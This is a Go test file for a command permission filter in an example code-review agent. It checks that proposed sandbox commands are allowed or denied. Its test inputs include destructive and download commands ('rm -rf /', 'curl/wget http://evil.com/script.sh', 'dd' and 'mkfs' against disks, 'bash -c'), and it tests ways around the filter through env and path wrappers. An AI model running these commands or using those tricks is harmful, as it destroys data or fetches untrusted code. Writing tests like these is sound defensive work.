//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//
//

package permission

import (
	"context"
	"testing"

	"github.com/trpc-group/trpc-agent-go/examples/code_review_agent/internal/config"
	"github.com/trpc-group/trpc-agent-go/examples/code_review_agent/internal/state"
	"github.com/trpc-group/trpc-agent-go/examples/code_review_agent/internal/types"
	"trpc.group/trpc-go/trpc-agent-go/graph"
)

func TestPermissionFilter_AllowNormalCommands(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "go_vet", Cmd: "go", Args: []string{"vet", "./..."}, RiskLevel: "low"},
				{Name: "go_test", Cmd: "go", Args: []string{"test", "./..."}, RiskLevel: "medium"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 2 {
		t.Fatalf("expected 2 allowed commands, got %d", len(allowed))
	}

	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	for _, d := range decisions {
		if d.Decision != "allow" {
			t.Errorf("command %s: expected allow, got %s", d.Command, d.Decision)
		}
	}
}

func TestPermissionFilter_DenyDangerousCommands(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "go_vet", Cmd: "go", Args: []string{"vet", "./..."}, RiskLevel: "low"},
				{Name: "evil_rm", Cmd: "rm", Args: []string{"-rf", "/"}, RiskLevel: "high"},
				{Name: "evil_sudo", Cmd: "sudo", Args: []string{"kill", "-9", "1"}, RiskLevel: "high"},
				{Name: "evil_curl", Cmd: "curl", Args: []string{"http://evil.com/script.sh"}, RiskLevel: "high"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	// Only go_vet should be allowed
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 1 {
		t.Fatalf("expected 1 allowed command, got %d", len(allowed))
	}
	if allowed[0].Name != "go_vet" {
		t.Errorf("expected go_vet to be allowed, got %s", allowed[0].Name)
	}

	// Check deny decisions
	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	denyCount := 0
	for _, d := range decisions {
		if d.Decision == "deny" {
			denyCount++
		}
	}
	if denyCount != 3 {
		t.Errorf("expected 3 deny decisions, got %d", denyCount)
	}
}

func TestPermissionFilter_AllDenyBlocksSandbox(t *testing.T) {
	// When all commands are denied, sandbox should get an empty list
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "bad", Cmd: "rm", Args: []string{"-rf", "/tmp"}, RiskLevel: "high"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 0 {
		t.Errorf("expected 0 allowed (all denied), got %d: %v", len(allowed), allowed)
	}
}

func TestPermissionFilter_NeedsHumanReview(t *testing.T) {
	// Middle-risk commands should be flagged for review
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "risky", Cmd: "custom-check", Args: []string{"--net"}, RiskLevel: "medium"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	if len(decisions) != 1 {
		t.Fatalf("expected 1 decision, got %d", len(decisions))
	}
	// Medium risk with default policy = "allow"
	if decisions[0].Decision != "allow" {
		t.Logf("medium risk decision: %s (default policy may vary)", decisions[0].Decision)
	}
}

func TestPermissionFilter_EmptyCommands(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 0 {
		t.Errorf("expected 0 allowed, got %d", len(allowed))
	}
}

// ── tokenize tests ──

func TestTokenize_SimpleCommand(t *testing.T) {
	tokens := tokenize("go vet ./...")
	if len(tokens) != 3 {
		t.Fatalf("expected 3 tokens, got %d: %v", len(tokens), tokens)
	}
	if tokens[0] != "go" || tokens[2] != "./..." {
		t.Errorf("unexpected tokens: %v", tokens)
	}
}

func TestTokenize_WithQuotedArgs(t *testing.T) {
	tokens := tokenize("echo \"hello world\" 'single quoted'")
	if len(tokens) != 3 {
		t.Fatalf("expected 3 tokens, got %d: %v", len(tokens), tokens)
	}
	if tokens[1] != "hello world" {
		t.Errorf("expected 'hello world', got %q", tokens[1])
	}
	if tokens[2] != "single quoted" {
		t.Errorf("expected 'single quoted', got %q", tokens[2])
	}
}

func TestTokenize_WithTabs(t *testing.T) {
	tokens := tokenize("go\tvet\t./...")
	if len(tokens) != 3 {
		t.Fatalf("tabs should split tokens, got %d", len(tokens))
	}
}

func TestTokenize_EmptyString(t *testing.T) {
	tokens := tokenize("")
	if len(tokens) != 0 {
		t.Errorf("expected 0 tokens for empty string, got %d", len(tokens))
	}
}

func TestTokenize_MultipleSpaces(t *testing.T) {
	tokens := tokenize("go   vet  ./...")
	if len(tokens) != 3 {
		t.Fatalf("multiple spaces should collapse to correct token count, got %d: %v", len(tokens), tokens)
	}
}

// ── isBlocked token-level tests ──

func TestIsBlocked_SudoBlocked(t *testing.T) {
	if !isBlocked("sudo kill -9 1") {
		t.Error("sudo should be blocked")
	}
}

func TestIsBlocked_MkfsBlocked(t *testing.T) {
	if !isBlocked("mkfs /dev/sda1") {
		t.Error("mkfs should be blocked")
	}
}

func TestIsBlocked_DdBlocked(t *testing.T) {
	if !isBlocked("dd if=/dev/zero of=/dev/sda") {
		t.Error("dd should be blocked")
	}
}

func TestIsBlocked_CurlBlocked(t *testing.T) {
	if !isBlocked("curl http://evil.com/script.sh") {
		t.Error("curl should be blocked")
	}
}

func TestIsBlocked_WgetBlocked(t *testing.T) {
	if !isBlocked("wget http://evil.com/script.sh") {
		t.Error("wget should be blocked")
	}
}

func TestIsBlocked_ChmodRecursiveBlocked(t *testing.T) {
	if !isBlocked("chmod -R 777 /tmp") {
		t.Error("chmod -R 777 should be blocked")
	}
	if !isBlocked("chmod -r 777 /tmp") {
		t.Error("chmod -r 777 should be blocked")
	}
	if !isBlocked("chmod a+rwx /tmp") {
		t.Error("chmod a+rwx should be blocked")
	}
}

func TestIsBlocked_ChmodWithoutFlagsAllowed(t *testing.T) {
	if isBlocked("chmod 755 /tmp/safe") {
		t.Error("chmod 755 without recursive/permissive flags should be allowed")
	}
	if isBlocked("chmod +x /usr/local/bin/tool") {
		t.Error("chmod +x should be allowed")
	}
}

func TestIsBlocked_RmRfBlocked(t *testing.T) {
	if !isBlocked("rm -rf /tmp") {
		t.Error("rm -rf should be blocked")
	}
	if !isBlocked("rm -fr /tmp") {
		t.Error("rm -fr should be blocked")
	}
	if !isBlocked("rm -r -f /tmp") {
		t.Error("rm -r -f should be blocked")
	}
}

func TestIsBlocked_RmNonRecursiveAllowed(t *testing.T) {
	if isBlocked("rm file.txt") {
		t.Error("rm without -r should be allowed")
	}
	if isBlocked("rm -f file.txt") {
		t.Error("rm -f without -r should be allowed")
	}
	if isBlocked("rm -r file.txt") {
		t.Error("rm -r without -f should be allowed (need both recursive and force)")
	}
}

func TestIsBlocked_ShDashCBlocked(t *testing.T) {
	if !isBlocked("sh -c 'rm -rf /'") {
		t.Error("sh -c should be blocked")
	}
	if !isBlocked("bash -c 'curl evil.com'") {
		t.Error("bash -c should be blocked")
	}
}

func TestIsBlocked_ShWithoutCDashAllowed(t *testing.T) {
	if isBlocked("sh script.sh") {
		t.Error("sh without -c should be allowed")
	}
	if isBlocked("bash setup.sh --verbose") {
		t.Error("bash without -c should be allowed")
	}
}

// ── isBlocked: Substring bypass prevention ──

func TestIsBlocked_EchoRmRfNotBlocked(t *testing.T) {
	if isBlocked("echo rm -rf /tmp") {
		t.Error("echo contains rm but should not be blocked (token-level, not substring)")
	}
}

func TestIsBlocked_EchoSudoNotBlocked(t *testing.T) {
	if isBlocked("echo sudo is dangerous") {
		t.Error("echo containing 'sudo' should not be blocked")
	}
}

func TestIsBlocked_EchoCurlNotBlocked(t *testing.T) {
	if isBlocked("echo curl http://example.com") {
		t.Error("echo containing 'curl' should not be blocked")
	}
}

// ── isBlocked: /dev/ redirection tests ──

func TestIsBlocked_DevNullAllowed(t *testing.T) {
	if isBlocked("go test -v 2>/dev/null") {
		t.Error(">/dev/null should be allowed (common in go test)")
	}
}

func TestIsBlocked_DevRedirectionBehavior(t *testing.T) {
	// >/dev/sda writes straight through to a block device and must be denied;
	// only the exact >/dev/null form is allowed.
	if !isBlocked("cat backup.img >/dev/sda") {
		t.Error(">/dev/sda redirection should be blocked")
	}
}

func TestPermissionFilter_DevRedirection(t *testing.T) {
	// Only the exact >/dev/null redirect is allowed; other >/dev/* targets
	// (e.g. >/dev/sda writing through to a block device) must be denied.
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "go_test_null", Cmd: "go", Args: []string{"test", "./...", ">/dev/null"}, RiskLevel: "low"},
				{Name: "evil_sda", Cmd: "go", Args: []string{"test", "./...", ">/dev/sda"}, RiskLevel: "low"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 1 || allowed[0].Name != "go_test_null" {
		t.Fatalf("expected only go_test_null allowed, got %v", allowed)
	}

	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	for _, d := range decisions {
		if d.Command == "go test ./... >/dev/sda" && d.Decision != "deny" {
			t.Errorf(">/dev/sda redirect: expected deny, got %s", d.Decision)
		}
		if d.Command == "go test ./... >/dev/null" && d.Decision != "allow" {
			t.Errorf(">/dev/null redirect: expected allow, got %s", d.Decision)
		}
	}
}

// ── hasRecursiveRemove tests ──

func TestHasRecursiveRemove_CombinedFlag(t *testing.T) {
	if !hasRecursiveRemove([]string{"rm", "-rf"}) {
		t.Error("-rf should be recursive + force")
	}
	if !hasRecursiveRemove([]string{"rm", "-fr"}) {
		t.Error("-fr should be recursive + force")
	}
}

func TestHasRecursiveRemove_SeparateFlags(t *testing.T) {
	if !hasRecursiveRemove([]string{"rm", "-r", "-f"}) {
		t.Error("-r -f should be recursive + force")
	}
	if !hasRecursiveRemove([]string{"rm", "-f", "-r"}) {
		t.Error("-f -r should be recursive + force")
	}
}

func TestHasRecursiveRemove_LongFlags(t *testing.T) {
	if !hasRecursiveRemove([]string{"rm", "--recursive", "--force"}) {
		t.Error("--recursive --force should be recursive + force")
	}
}

func TestHasRecursiveRemove_OnlyRecursive(t *testing.T) {
	if hasRecursiveRemove([]string{"rm", "-r"}) {
		t.Error("-r alone should NOT be recursive + force")
	}
}

func TestHasRecursiveRemove_OnlyForce(t *testing.T) {
	if hasRecursiveRemove([]string{"rm", "-f"}) {
		t.Error("-f alone should NOT be recursive + force")
	}
}

// ── Integration: token-level matching via Run ──

func TestPermissionFilter_TokenLevelDeny(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "echo_rm", Cmd: "echo", Args: []string{"rm", "-rf"}, RiskLevel: "low"},
			},
		},
	}
	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 1 {
		t.Fatalf("echo rm -rf should be allowed (token-level, not substring), got %d allowed", len(allowed))
	}
	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	if decisions[0].Decision != "allow" {
		t.Errorf("echo rm -rf: expected allow, got %s", decisions[0].Decision)
	}
}

func TestPermissionFilter_ShDashCBlocked(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "inline_script", Cmd: "sh", Args: []string{"-c", "rm -rf /"}, RiskLevel: "high"},
			},
		},
	}
	result, _ := Run(context.Background(), gs)
	finalState := result.(graph.State)
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 0 {
		t.Errorf("sh -c should be blocked, got %d allowed", len(allowed))
	}
}

func TestPermissionFilter_ChmodRecursiveBlocked(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "bad_chmod", Cmd: "chmod", Args: []string{"-R", "777", "/tmp"}, RiskLevel: "high"},
			},
		},
	}
	result, _ := Run(context.Background(), gs)
	finalState := result.(graph.State)
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 0 {
		t.Errorf("chmod -R 777 should be blocked, got %d allowed", len(allowed))
	}
}

func TestPermissionFilter_ChmodSafeAllowed(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "safe_chmod", Cmd: "chmod", Args: []string{"+x", "/usr/local/bin/tool"}, RiskLevel: "low"},
			},
		},
	}
	result, _ := Run(context.Background(), gs)
	finalState := result.(graph.State)
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 1 {
		t.Errorf("chmod +x should be allowed, got %d allowed", len(allowed))
	}
}

func TestPermissionFilter_DefaultTimeoutApplied(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "test", Cmd: "go", Args: []string{"vet", "./..."}, RiskLevel: "low", Timeout: 0},
			},
		},
	}
	result, _ := Run(context.Background(), gs)
	finalState := result.(graph.State)
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 1 {
		t.Fatalf("expected 1 allowed command, got %d", len(allowed))
	}
	if allowed[0].Timeout != 30000 {
		t.Errorf("zero timeout should default to 30000ms, got %d", allowed[0].Timeout)
	}
}

// ── Zero-argument command override tests ──

func TestIsBlocked_ZeroArgCommandNoTrailingSpace(t *testing.T) {
	// A command with no arguments should not have a trailing space in fullCmd.
	// This test verifies isBlocked correctly handles single-token commands.
	if isBlocked("staticcheck") {
		t.Error("staticcheck alone should not be blocked by deny-list")
	}
}

func TestPermissionFilter_OverrideMatchesZeroArgCommand(t *testing.T) {
	// Override pattern "staticcheck" must match command "staticcheck" (no args).
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "check", Cmd: "staticcheck", Args: []string{}, RiskLevel: "low"},
			},
		},
		state.StateKeyPermissionConfig: config.PermissionConfig{
			DefaultPolicy: map[string]string{"low": "allow"},
			Overrides: []config.PermOverride{
				{Pattern: "staticcheck", Decision: "deny", Reason: "blocked by override"},
			},
		},
	}
	result, _ := Run(context.Background(), gs)
	finalState := result.(graph.State)
	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	if len(decisions) != 1 {
		t.Fatalf("expected 1 decision, got %d", len(decisions))
	}
	if decisions[0].Decision != "deny" {
		t.Errorf("staticcheck override should deny zero-arg command, got %s", decisions[0].Decision)
	}
}

// ── Path/wrapper bypass tests ──

func TestIsBlocked_PathPrefixedRmBlocked(t *testing.T) {
	if !isBlocked("/bin/rm -rf /tmp") {
		t.Error("/bin/rm -rf should be blocked (path normalization)")
	}
	if !isBlocked("/usr/bin/rm -rf /tmp") {
		t.Error("/usr/bin/rm -rf should be blocked (path normalization)")
	}
}

func TestIsBlocked_EnvWrapperBlocked(t *testing.T) {
	if !isBlocked("env rm -rf /tmp") {
		t.Error("env rm -rf should be blocked (wrapper unwrapping)")
	}
}

func TestIsBlocked_CommandWrapperBlocked(t *testing.T) {
	if !isBlocked("command rm -rf /tmp") {
		t.Error("command rm -rf should be blocked (wrapper unwrapping)")
	}
}

func TestIsBlocked_EnvEchoAllowed(t *testing.T) {
	// env wrapping a safe command should still be allowed
	if isBlocked("env echo hello") {
		t.Error("env echo should be allowed")
	}
}

// ── Wrapper bypass: env with options/assignments ──

func TestIsBlocked_EnvWithDashIBypass(t *testing.T) {
	if !isBlocked("env -i rm -rf /tmp") {
		t.Error("env -i rm -rf should be blocked (skip wrapper options)")
	}
}

func TestIsBlocked_EnvWithAssignmentBypass(t *testing.T) {
	if !isBlocked("env FOO=1 rm -rf /tmp") {
		t.Error("env FOO=1 rm -rf should be blocked (skip env assignments)")
	}
}

func TestIsBlocked_PathPrefixedEnvBypass(t *testing.T) {
	if !isBlocked("/usr/bin/env rm -rf /tmp") {
		t.Error("/usr/bin/env rm -rf should be blocked (path normalization + wrapper)")
	}
}

func TestIsBlocked_CommandWithDashPBypass(t *testing.T) {
	if !isBlocked("command -p rm -rf /tmp") {
		t.Error("command -p rm -rf should be blocked (skip wrapper options)")
	}
}

func TestIsBlocked_EnvMultipleOptions(t *testing.T) {
	if !isBlocked("env -i FOO=1 BAR=2 -S rm -rf /tmp") {
		t.Error("env with mixed options/assignments should still find and block rm")
	}
}
